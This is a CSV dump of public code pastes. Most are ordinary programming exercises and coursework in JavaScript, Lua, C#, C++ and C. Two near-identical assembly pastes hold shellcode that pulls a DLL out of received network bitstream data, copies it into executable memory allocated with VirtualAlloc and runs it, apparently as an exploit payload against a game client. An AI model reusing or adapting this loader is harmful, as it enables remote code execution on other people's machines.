id,title,username,language,date,content
RZ3W4jnJ,костыль меню,Igor150195,JavaScript,Monday 15th of April 2024 10:11:24 AM CDT,"<script>
    document.addEventListener('DOMContentLoaded', function() {
        document.querySelectorAll('.popup-menu-sublevels .popup-sublevels-item').forEach(function(element) {
            let category = element.dataset.category;
            let subcategory = element.dataset.subcategory;
    
            if (category !== """" && subcategory !== """") {
                document.querySelectorAll('.nav-menu-item-wrap').forEach(function(menuItem) {
                    let currentCategory = menuItem.dataset.category;
                    let sublevelsHiddenContainer = menuItem.querySelector('.menu-sublevels-hidden');
    
                    if (category === currentCategory) {
                        sublevelsHiddenContainer.appendChild(element.cloneNode(true));
                    }
                });
            }
        });
    
        document.querySelectorAll('.nav-menu-item-wrap').forEach(function(menuItem) {
            let subcategoryNames = [];
            let sublevelsWrap = menuItem.querySelector('.menu-sublevels-wrap');
            let sublevels = menuItem.querySelectorAll('.popup-sublevels-item');
    
            sublevels.forEach(function(sublevel) {
                subcategoryNames.push(sublevel.dataset.subcategory);
            });
    
            let uniqueArr = Array.from(new Set(subcategoryNames));
    
            uniqueArr.forEach(function(subcategoryName) {
                sublevelsWrap.innerHTML += `
                    <div class=""menu-sublevels-box"">
                        <div class=""menu-sublevels-box-title subtitle-2"">${subcategoryName}</div>
                        <div class=""menu-sublevels-box-body""></div>
                    </div>
                `;
            });
        });
    
        document.querySelectorAll('.nav-menu-item-wrap').forEach(function(menuItem) {
            let boxes = menuItem.querySelectorAll('.menu-sublevels-box');
            let sublevels = menuItem.querySelectorAll('.menu-sublevels-hidden .popup-sublevels-item');
    
            boxes.forEach(function(box) {
                let boxBody = box.querySelector('.menu-sublevels-box-body');
                let boxSubcategory = box.querySelector('.menu-sublevels-box-title').textContent;
    
                sublevels.forEach(function(sublevel) {
                    let subcategory = sublevel.dataset.subcategory;
    
                    if (subcategory === boxSubcategory) {
                        boxBody.appendChild(sublevel.cloneNode(true));
                    }
                });
            });
        });
    });
</script>"
uvhzmzzR,raycasting,AlewAlow,Lua,Monday 15th of April 2024 10:11:24 AM CDT,"local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local UserInputService = game:GetService(""UserInputService"")

local Matter = require(ReplicatedStorage.Shared.Libs.Matter)
local Components = require(ReplicatedStorage.Shared.Components)
local Constants = require(ReplicatedStorage.Shared.Constants)

local GetEntityGlobalScale = require(ReplicatedStorage.Shared.Utils.GetEntityGlobalScale)
local GetEntityGlobalPosition = require(ReplicatedStorage.Shared.Utils.GetEntityGlobalPosition)
local GetEntityDescendants = require(ReplicatedStorage.Shared.Utils.GetEntityDescendants)

local function FireRaycast(origin, direction, entities, world)
	if type(entities) == ""number"" then
		entities = GetEntityDescendants(entities, world)
	end

	local closestHitDistance = math.huge
	local closestHitNormal = nil
	local closestHitPosition = nil
	local closestHit = nil

	for _, id in entities do
		local transform = world:get(id, Components.Transform)
		if not transform then
			continue
		end

		local collider = world:get(id, Components.Collider)
		if not collider then
			continue
		end

		local globalSize = GetEntityGlobalScale(id, world) * collider.Size
		local globalPosition = GetEntityGlobalPosition(id, world)

		local tp = globalPosition - globalSize / 2
		local br = globalPosition + globalSize / 2
		
		local t1 = (tp - origin) / direction
		local t2 = (br - origin) / direction
		
		local entryTimeX = math.max(math.min(t1.X, t2.X), 0)
		local exitTimeX = math.min(math.max(t1.X, t2.X), 1)
		local entryTimeY = math.max(math.min(t1.Y, t2.Y), 0)
		local exitTimeY = math.min(math.max(t1.Y, t2.Y), 1)
		
		if entryTimeX > exitTimeY or entryTimeY > exitTimeX then
			continue
		end
		
		local hitDistance = math.max(entryTimeX, entryTimeY)
		if hitDistance >= closestHitDistance then
			continue
		end
		
		closestHitPosition = origin + direction * hitDistance
		closestHitDistance = hitDistance
		closestHit = id

		if entryTimeX > entryTimeY then
			if t1.X < t2.X then
				closestHitNormal = Vector2.new(-1, 0)
			else
				closestHitNormal = Vector2.new(1, 0)
			end
		else
			if t1.Y < t2.Y then
				closestHitNormal = Vector2.new(0, -1)
			else
				closestHitNormal = Vector2.new(0, 1)
			end
		end
	end

	if closestHitNormal then
		return {
			Position = closestHitPosition,
			Normal = closestHitNormal,
			Hit = closestHit,
		}
	end
	
	return false
end


return FireRaycast"
nS3EqeNx,Untitled,Rodunskiy,C#,Monday 15th of April 2024 09:15:16 AM CDT,"int goldCount;
int crystalPrice = 10;
int crystalCount;
int crystalAllPrice;
bool isBuying = false;

Console.WriteLine(""Сколько у вас золота в кошельке?"");
goldCount = Convert.ToInt32(Console.ReadLine());

while (isBuying != true)
{
    Console.Clear();
    Console.WriteLine($""У вас {goldCount} золота в кошельке.\nЦена 1 кристалла {crystalPrice} золота.\nСколько кристисталлов вы хотите купить?"");
    crystalCount = Convert.ToInt32(Console.ReadLine());

    crystalAllPrice = crystalCount * crystalPrice;

    if (crystalAllPrice <= goldCount)
    {
        goldCount -= crystalAllPrice;
        isBuying = true;

        Console.WriteLine($""Вы купили {crystalCount} кристаллов.\nВ кошельке осталось {goldCount} золота."");
    }
    else if (crystalAllPrice >= goldCount)
    {
        Console.WriteLine(""У вас недостаточно средств!\nПопробуйте еще раз."");
        Console.ReadLine();
    }
}



"
pjyibZzq,СПРИНТ № 7 | Модель памяти в C++ | Урок 4: Указатели и константность,chevengur,C++,Monday 15th of April 2024 09:10:41 AM CDT,"#include <algorithm>
#include <cassert>
#include <iostream>
#include <string>
#include <tuple>
#include <vector>

using namespace std;

// Породы кошек
enum class CatBreed {
    Bengal,
    Balinese,
    Persian,
    Siamese,
    Siberian,
    Sphynx,
};

// Пол
enum class Gender {
    Male,
    Female,
};

struct Cat {
    string name;
    Gender gender;
    CatBreed breed;
    int age;
};

string CatBreedToString(CatBreed breed) {
    switch (breed) {
    case CatBreed::Bengal:
        return ""Bengal""s;
    case CatBreed::Balinese:
        return ""Balinese""s;
    case CatBreed::Persian:
        return ""Persian""s;
    case CatBreed::Siamese:
        return ""Siamese""s;
    case CatBreed::Siberian:
        return ""Siberian"";
    case CatBreed::Sphynx:
        return ""Sphynx""s;
    default:
        throw invalid_argument(""Invalid cat breed""s);
    }
}

ostream& operator<<(ostream& out, CatBreed breed) {
    out << CatBreedToString(breed);
    return out;
}

ostream& operator<<(ostream& out, Gender gender) {
    out << (gender == Gender::Male ? ""male""s : ""female""s);
    return out;
}

ostream& operator<<(ostream& out, const Cat& cat) {
    out << '{' << cat.name << "", ""s << cat.gender;
    out << "", breed: ""s << cat.breed << "", age:""s << cat.age << '}';
    return out;
}

// Возвращает массив указателей на элементы вектора cats, отсортированные с использованием
// компаратора comp. Компаратор comp - функция, принимающая два аргумента типа const Cat&
// и возвращающая true, если значения упорядочены, и false в ином случае
template <typename Comparator>
vector<const Cat*> GetSortedCats(const vector<Cat>& cats, const Comparator& comp) {
    vector<const Cat*> sorted_cat_pointers;
    for (const auto& cat : cats)
    {
        sorted_cat_pointers.push_back(&cat);
    }

    sort(sorted_cat_pointers.begin(), sorted_cat_pointers.end(), [comp](const Cat* lhs, const Cat* rhs) {
        return comp(*lhs, *rhs);
    });
    
    /*
    Напишите тело функции самостоятельно. Подсказка:
    1) Поместите в массив sorted_cat_pointers адреса объектов из массива cats.
    2) Отсортируйте массив sorted_cat_pointers с помощью переданного компаратора comp.
       Так как comp сравнивает ссылки на объекты, а отсортировать нужно указатели,
       передайте в sort лямбда функцию, принимающую указатели и сравнивающую объекты
       при помощи компаратора comp:
       [comp](const Cat* lhs, const Cat* rhs) {
           return comp(*lhs, *rhs);
       }
    */
    return sorted_cat_pointers;
}

// Выводит в поток out значения объектов, на который ссылаются указатели вектора cat_pointers.
// Пример вывода элементов vector<const Cat*>:
// {{Tom, male, breed: Bengal, age:2}, {Charlie, male, breed: Balinese, age:7}}
void PrintCatPointerValues(const vector<const Cat*>& cat_pointers, ostream& out) {
    if (cat_pointers.empty())
        out << ""{}"";
    else {
        out << ""{"";
        bool alpha_ = true;
        for (const auto& cat_pointer : cat_pointers)
        {
            if (alpha_)
            {
                out << *cat_pointer;
                alpha_ = false;
            }
            else
            {
                out << "", "" << *cat_pointer;
            }
        }
        
        
        out << ""}"";
    }
}
        

int main() {
    const vector<Cat> cats = {
        {""Tom""s, Gender::Male, CatBreed::Bengal, 2},
        {""Leo""s, Gender::Male, CatBreed::Siberian, 3},
        {""Luna""s, Gender::Female, CatBreed::Siamese, 1},
        {""Charlie""s, Gender::Male, CatBreed::Balinese, 7},
        {""Ginger""s, Gender::Female, CatBreed::Sphynx, 5},
        {""Tom""s, Gender::Male, CatBreed::Siamese, 2},
    };

    {
        auto sorted_cats = GetSortedCats(cats, [](const Cat& lhs, const Cat& rhs) {
            return tie(lhs.breed, lhs.name) < tie(rhs.breed, rhs.name);
            });

        cout << ""Cats sorted by breed and name:""s << endl;
        PrintCatPointerValues(sorted_cats, cout);
        cout << endl;
    }

    {
        auto sorted_cats = GetSortedCats(cats, [](const Cat& lhs, const Cat& rhs) {
            return tie(lhs.gender, lhs.breed) < tie(rhs.gender, rhs.breed);
            });

        cout << ""Cats sorted by gender and breed:""s << endl;
        PrintCatPointerValues(sorted_cats, cout);
        cout << endl;
    }
    return 0;
}"
GvTtXYym,Untitled,Hidend,ASM (NASM),Monday 15th of April 2024 08:48:50 AM CDT,";# repair stack
lea esp, [ebp-0x128]

;# get bitstream
mov eax, [ebp+0x3c]             ;# caption
sub eax, 0x118                  ;# bitstream
mov ecx, [eax]                  ;# numberOfBitsUsed
mov edx, [eax+0x8]              ;# readOffset
mov esi, [eax+0xC]              ;# data ptr
add ecx, 7                      ;# numberOfBitsUsed bits to bytes
shr ecx, 3          
add edx, 7                      ;# readOffset bits to bytes
shr edx, 3          
sub ecx, edx                    ;# numberOfBitsUsed - readOffset = dll size
add esi, edx                    ;# data ptr         + readOffset = dll ptr

;# check if dll size is 0
test ecx, ecx                   ;# test ecx (dll size)
jz epilogue                     ;# if zero, skip to epilogue

;# call VirtualAlloc
push ecx                        ;# save ecx
push 0x40                       ;# flProtect = PAGE_EXECUTE_READWRITE
push 0x3000                     ;# flAllocationType = MEM_COMMIT | MEM_RESERVE
push ecx                        ;# dwSize = dll size
push 0                          ;# lpAddress = 0
mov eax, dword ptr [0x008581A4] ;# get VirtualAlloc
call eax                        ;# call VirtualAlloc
mov edi, eax
pop ecx                         ;# restore ecx

;# copy dll
rep movsb

;# execute dll
call eax
jmp epilogue 					;# To be honest, not sure if needed or it does directly go to epilogue

epilogue:
pop edi
pop esi
mov eax, 1
pop ebx
mov esp, ebp
pop ebp
ret 8"
82tBtdck,S9 SDA - liste simplu inlantuite,Alx09,C,Monday 15th of April 2024 08:41:54 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct nod { // definire lista
    struct nod* urm; // prima inlantuire
    int id;// elemente lista
}nod;


void AddSorted(struct nod* head, struct nod* p) {// functia de adaugare sortata
    struct nod* q = head;// nod folosit pentru parcurgea listei
    if (head == NULL) // (!head) verificam daca sunt elemente in lista
    {
        head = p;// daca nu sunt capul listel devine noul element
    }
    else if (head->id > p->id) { // verificam daca elementul adaugat trebuie adaugat in capul listei
        p->urm = head; //elementul aduaugat va avea in pareta dreapta lista existenta
        head = p; // noul element va devieni capatul(radidacian listi)
    }
    else {
        while (q->urm != NULL && q->urm->id < p->id) { // parcurgem lista ca sa gasim pozitia de inserare
            q = q->urm;// parcurgere lista
        }
        p->urm = q->urm;// elementu nou va avea in dreapta ce avea poztia la care s-a gasit inserarea
        q->urm = p;
    }
}
struct nod* Remove(struct nod* head, int id) { //sterge nod
    struct nod* aux = NULL, *q = NULL;// nodul aux este pentreu retinire tempara nod sters, q este folosit pentru parcurgere
    if (head == NULL) {// verificam daca capul este null altfel return null ca si adresa
        return NULL;
    }
    else if (head->id == id) {// verificam daca este capul listei nodul sters
        aux = head;// salvam temporar nodul
        head = head->urm;// capul devine umaatorul element
        return aux;// returnam adresa nodul pe care vrem sa-l stergem in caz ce se vrea prelucat ceva dupa
    }
    else {
        q = head;// daca nu e la inceput parcurgem lista
        while (q->urm  != NULL && q->urm->id != id) {// ca la adaugarea sorata cautam pozita anterioara nodul pe care vrem sa-l stergem
            q = q->urm;// parcurgem lista
        }
        if (q->urm == NULL) {// daca s-a ajuns la sfarsitul listei si nu s-a gasit
            return NULL;// returnam null deoarece nodul nu se afla in lista
        }
        else {
            aux = q->urm;// altfel salvam nodul urmator(nodul ce trebuie stres)
            q->urm = q->urm->urm;// nodul anterior va pointa catre nodul din dtreapa celui sters
            return aux;// returnam nodul pe care vrem sa-l stergem
        }
    }
}// atentie aici am refacut legaturile, memoria va ramane alocata pana se foloseste free()


void Show(struct nod* head) {// toat functiile le am implementat sa primeasca head deaorece e mai ok asa
    struct nod* p = head;// ne punem pe capul listei

    while (p != NULL) {// cat timp nu s-a ajuns la sfarsitul fiserului
        printf(""%d "", p->id);// afisam id
        p = p->urm;// parcurgem lista
    }
}


int main()
{
    int v[] = {4, 1, 5, 8, 3, 0}, n = sizeof(v)/ 4;// initialziam mai usor lementele listei

    int i;
    struct nod* p = NULL;// nodul nou adaugat
    struct nod* head = NULL;// capul listei
    for (i = 0; i < n; i++) {// facem un for pentru a adauga mai usor elementele exemplu
        p = (nod*)malloc(sizeof(struct nod));// alocam memorie penteu fiecare element si salvam temprorar in p adresa returnata de malloc
        p->id = v[i];// atrbuim valoareaa
        p-> urm = NULL;// mereu sa intializati nodurile cu NULL
        AddSorted(&head, &p);//Apelam functia de sortare - sa folositi mereu & pentru ca apar probleme
    }
    printf(""Lista simplu inlantuita - Adaugare sortata: "");  Show(head);// afisam
    p = Remove(&head, 3);// apelam functia de sorate care returneaza adresa nodul de sters
    free(p);// aici eliberam memoria alocata.
    printf(""\nDupa eliminarea elemtului 3: "");  Show(head);
    p = Remove(&head, 8);
    free(p);
    printf(""\nDupa eliminarea elemtului 8: "");  Show(head);
    p = Remove(&head, 0);
    free(p);
    printf(""\nDupa eliminarea elemtului 0: "");  Show(head);
}"
CpG0vcGC,Untitled,Rodunskiy,C#,Monday 15th of April 2024 08:36:52 AM CDT,"string name = ""Баранов"";
string surname = ""Олег"";
string temporaryVariable;

Console.WriteLine($""Имя:{name}\nФамилия:{surname}\n"");

temporaryVariable = name;
name = surname;
surname = temporaryVariable;

Console.WriteLine($""Имя:{name}\nФамилия:{surname}"");"
BZc3zxGg,Untitled,Hidend,ASM (NASM),Monday 15th of April 2024 08:35:03 AM CDT,";# repair stack
lea esp, [ebp-0x128]

;# get bitstream
mov eax, [ebp+0x3c]             ;# caption
sub eax, 0x118                  ;# bitstream
mov ecx, [eax]                  ;# numberOfBitsUsed
mov edx, [eax+0x8]              ;# readOffset
mov esi, [eax+0xC]              ;# data ptr
add ecx, 7                      ;# numberOfBitsUsed bits to bytes
shr ecx, 3          
add edx, 7                      ;# readOffset bits to bytes
shr edx, 3          
sub ecx, edx                    ;# numberOfBitsUsed - readOffset = dll size
add esi, edx                    ;# data ptr         + readOffset = dll ptr

;# check if empty
test ecx, ecx
jz epilogue

;# call VirtualAlloc
push ecx                        ;# save ecx
push 0x40                       ;# flProtect = PAGE_EXECUTE_READWRITE
push 0x3000                     ;# flAllocationType = MEM_COMMIT | MEM_RESERVE
push ecx                        ;# dwSize = dll size
push 0                          ;# lpAddress = 0
mov eax, dword ptr [0x008581A4] ;# get VirtualAlloc
call eax                        ;# call VirtualAlloc
mov edi, eax
pop ecx                         ;# restore ecx

;# copy dll
rep movsb

;# execute dll
call eax

;# epilogue
pop edi
pop esi
mov eax, 1
pop ebx
mov esp, ebp
pop ebp
ret 8"
daWf7KT8,Untitled,Rodunskiy,C#,Monday 15th of April 2024 08:29:42 AM CDT,"int pictures = 52;
int picturesCountInRow = 3;
int filledRows;
int extraPictures;

filledRows = pictures / picturesCountInRow;
extraPictures = pictures % picturesCountInRow;

Console.WriteLine($""Полностью заполненные ряды:{filledRows}\nЛишние картинки:{extraPictures}"");"
zFgybQwr,Untitled,wym1111,C++,Monday 15th of April 2024 08:21:01 AM CDT,"#include <bits/stdc++.h>
using namespace std;

int n;
int a[4];
int ans = 200;

void dfs (int x, int b[4]) {
	for (int i = 0; i < 4; i ++) {
		cout << b[i] << ' ';
	}
	cout << x << endl;
	if (x == 0) {
//		b: 2 1 0 6
//		20 16
		int res = (b[0] + b[1]) * 10 + b[2] + b[3];
		ans = min(ans, res);
		return;
	}
	for (int i = 0; i <= 4; i ++) {
		if(b[i] != -1) continue;
		int c[4];
		for (int j = 0; j < 4; j ++) c[j] = b[j];
		c[i] = a[x - 1];
		dfs(x - 1, c);
	}
}

int main() {
	cin >> n;
	for (int i = 0; i < 4; i ++) {
		a[i] = n % 10;
		n /= 10;
	}
	cout << ""a: "";
	for (int i = 0; i < 4; i ++) cout << a[i] << ' ';
	cout << endl;
	int s[4] = {-1, -1, -1, -1};
	dfs(4, s);
	cout << ans << endl;
	return 0;
}"
4mLJK0L0,Untitled,Rodunskiy,C#,Monday 15th of April 2024 08:19:29 AM CDT,"string name;
string zodiacSign;
string job;
int age;

Console.WriteLine(""Здравствуйте! Ответьте на пару вопросов."");

Console.WriteLine(""Как вас зовут?"");
name = Console.ReadLine();

Console.WriteLine(""Какой ваш знак зодиака?"");
zodiacSign = Console.ReadLine();

Console.WriteLine(""Где вы работаете?"");
job = Console.ReadLine();

Console.WriteLine(""Сколько вам лет?"");
age = Convert.ToInt32(Console.ReadLine());

Console.Clear();

Console.WriteLine($""Вас зовут:{name}, вам {age} лет, вы {zodiacSign} и работаете на {job}"");
"
Skpgeiy7,Untitled,pascallius,C,Monday 15th of April 2024 08:09:01 AM CDT,"#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stddef.h>
#include <assert.h>
#include <poll.h>
#include <errno.h>
#include <time.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <netinet/in.h>


#include ""rlib.h""
#include ""buffer.h""

#define miliseconds(n) 1000000 * n 

static int checks(rel_t *r, packet_t *pkt, size_t n);
static void process_ACK_PKG(rel_t *r, packet_t *pkt, size_t n);
static void process_DATA_PKG(rel_t *r, packet_t *pkt, size_t n);
static int is_duplicate(rel_t *r, packet_t *pkt);
static long now_ms();
static int get_send_window_size(rel_t *r);
static void send_ACK_PKG(rel_t *r, uint32_t ack);
static packet_t *create_DATA_PKG(rel_t *r);


struct reliable_state {
    rel_t *next;			/* Linked list for traversing all connections */
    rel_t **prev;

    conn_t *c;			/* This is the connection object */

    
    size_t window_size;
    uint32_t next_seq;
    int timeout;
    
    uint32_t  lowest_ackno;
    uint32_t  send_nxt;
    int send_eof;
    int send_eof_acked;
    int rec_eof;
    uint32_t next_received;


    //buffers
    buffer_t* send_buffer;
    buffer_t* rec_buffer;

};
rel_t *rel_list;

// **********************Static helper functions Start***************
static int get_send_window_size(rel_t *r){
    return r->send_nxt - r->lowest_ackno;
}

static long now_ms() {
    struct timeval now;
    gettimeofday(&now, NULL);
    return now.tv_sec * 1000 + now.tv_usec / 1000;
}

static int is_duplicate(rel_t *r, packet_t *pkt){
    return ntohl(pkt->seqno) < r->next_received;
}
static int checks(rel_t *r, packet_t *pkt, size_t n){
    int rcv_check = pkt->cksum;
    pkt->cksum = 0;
    if(ntohs(pkt->len)!= n){
        return -1;
    }
    if(rcv_check != cksum(pkt,n)){
        return -1;
    }

    pkt->cksum = rcv_check;
    return 0;
}

static void send_ACK_PKG(rel_t *r, uint32_t ack){
    struct ack_packet *a = xmalloc(sizeof(struct ack_packet));
    a->cksum = 0;
    a->len = htons(8);
    a->ackno = htonl(ack);
    a->cksum = cksum(a,8);
    conn_sendpkt(r->c, (packet_t *)a, 8);
    free(a);

}

static void process_ACK_PKG(rel_t *r, packet_t *pkt, size_t n){
    if(buffer_size(r->send_buffer)==0) return;
    if(ntohl(pkt->ackno)>r->lowest_ackno){ // send una?
        r->lowest_ackno = ntohl(pkt->ackno);
        buffer_remove(r->send_buffer, r->lowest_ackno);
    }
    if(r->send_eof){ // send eof?
        if(buffer_size(r->send_buffer)==0) r->send_eof_acked = 1;
    }
    if (r->send_eof_acked && r->rec_eof && buffer_size(r->send_buffer)==0){
        rel_destroy(r);

    }else if(get_send_window_size(r) < r->window_size){
        rel_read(r);
    }
    return;
}

static packet_t *create_DATA_PKG(rel_t *r){ //TODO
    packet_t *pkt;
    pkt = xmalloc(sizeof(packet_t));
    int input = conn_input(r->c, pkt->data, 500);

    if (input == 0) {
        free(pkt);
        return NULL;
    }
    
    pkt->cksum = 0;
    pkt->len = htons(12 + ((input == -1) ? 0 : input));
    pkt->ackno = htonl(r->next_received);
    pkt->seqno = htonl(r->send_nxt);
    pkt->cksum = cksum(pkt, ntohs(pkt->len));
    return pkt;
}

static void process_DATA_PKG(rel_t *r, packet_t *pkt, size_t n){

if (is_duplicate(r, pkt)) {
        send_ACK_PKG(r, ntohl(pkt->seqno) + 1);
        return;
    }

    if (r->rec_eof) {
        if (r->send_eof_acked) rel_destroy(r);
        return;
    }

    // ignore out-of-window packets
    if (ntohl(pkt->seqno) >= r->next_received + r->window_size) return;

    if (buffer_size(r->rec_buffer) == r->window_size) {
        rel_output(r);
    }

    // store in buffer if not already there
    if (!buffer_contains(r->rec_buffer, ntohl(pkt->seqno))) {
        buffer_insert(r->rec_buffer, pkt, now_ms());
    }

    rel_output(r);
}
// **********************Static helper functions END***************

rel_t *
rel_create (conn_t *c, const struct sockaddr_storage *ss,
const struct config_common *cc)
{
    rel_t *r;

    r = xmalloc (sizeof (*r));
    memset (r, 0, sizeof (*r));

    if (!c) {
        c = conn_create (r, ss);
        if (!c) {
            free (r);
            return NULL;
        }
    }

    r->c = c;
    r->next = rel_list;
    r->prev = &rel_list;
    if (rel_list)
    rel_list->prev = &r->next;
    rel_list = r;

    r->send_buffer = xmalloc(sizeof(buffer_t));
    r->send_buffer->head = NULL;
    r->lowest_ackno = 1;
    r->send_nxt = 1;
    r->send_eof = 0;
    r->send_eof_acked = 0;

    // receive
    r->rec_buffer = xmalloc(sizeof(buffer_t));
    r->rec_buffer->head = NULL;
    r->next_received = 1;
    r->rec_eof = 0;

    r->window_size = cc->window;
    r->timeout = cc->timeout;

    return r;
}

void
rel_destroy (rel_t *r)
{
    if (r->next) {
        r->next->prev = r->prev;
    }
    *r->prev = r->next;
    conn_destroy (r->c);
    buffer_clear(r->send_buffer);
    free(r->send_buffer);
    buffer_clear(r->rec_buffer);
    free(r->rec_buffer);
    free(r);

}


void
rel_recvpkt (rel_t *r, packet_t *pkt, size_t n)
{
    if(checks(r,pkt,n)==-1) return;

    // if its only an ACK packet
    if(n==8){
        process_ACK_PKG(r, pkt, n);
    }else{
        process_DATA_PKG(r, pkt, n);
    }


}

void
rel_read (rel_t *s)
{
    /*
    char buffer[s->window_size];
    int size = conn_input(s->c,buffer,conn_bufspace(s->c));
    if(size==0||size==-1){
        return NULL;
    }

    packet_t *pkt = malloc(sizeof(*pkt));

    // first only process packets which fit into the packet
    int off = 0;
    if(size < 500){
        build_packet(pkt, size + 12);
        strncpy(pkt->data, &buffer[0],size); //TODO change offset here
    }else{
        printf(""Too large packet in rel_read"");
    }
    //TODO: implement for larger input

    free(pkt);
    */
   {
    // read and send as long as:
    // 1. send window is not full, and
    // 2. no EOF has been read from stdin
    while ((get_send_window_size(s) < s->window_size) && !s->send_eof) {
        packet_t *pkt = create_DATA_PKG(s);

        // if stdin is empty, return
        if (pkt == NULL) return;

        // set flag if EOF has been read from stdin
        if (ntohs(pkt->len) == 12) s->send_eof = 1;

        conn_sendpkt(s->c, pkt, ntohs(pkt->len));
        buffer_insert(s->send_buffer, pkt, now_ms());
        free(pkt);
        s->send_nxt++;
    }
}

}

void
rel_output (rel_t *r) 
{   

    //not empty
    if(buffer_size(r->rec_buffer)!=0){
        buffer_node_t* node = buffer_get_first(r->rec_buffer);
        size_t free_b = conn_bufspace(r->c);
        size_t used = 0;
        uint32_t num_b = 0;
        int out_size;
        while(node&&num_b<(r->window_size)){
            if (!buffer_contains(r->rec_buffer, r->next_received) || r->next_received != ntohl(node->packet.seqno)) break;
            uint16_t payload_size = ntohs(node->packet.len) - 12;
            if (used + payload_size > free_b) break;
            if(payload_size==0) r->rec_eof =1;

            out_size = conn_output(r->c,node->packet.data,payload_size);
            assert(out_size>=0);
            used += payload_size;
            r->next_received++;
            node = node->next;
            buffer_remove_first(r->rec_buffer);

            num_b++;
        }

        //ackno
        send_ACK_PKG(r, r->next_received);
    }else{
        if(r->send_eof_acked){
            rel_destroy(r);
        }
        return;
    }
}

void
rel_timer ()
{
    rel_t *current = rel_list;
    struct timespec now;
    while (current != NULL) {
        for(buffer_node_t* node = buffer_get_first(current->send_buffer);node;node=node->next){
            if(clock_gettime(CLOCK_MONOTONIC,&now)==-1) return;
            if(miliseconds(now.tv_nsec) - (node->last_retransmit)>current->timeout){
                node->last_retransmit = miliseconds(now.tv_nsec);
                conn_sendpkt(current->c,&node->packet,ntohs(node->packet.len));
            }



        }
        current = current->next;
    }
}


"
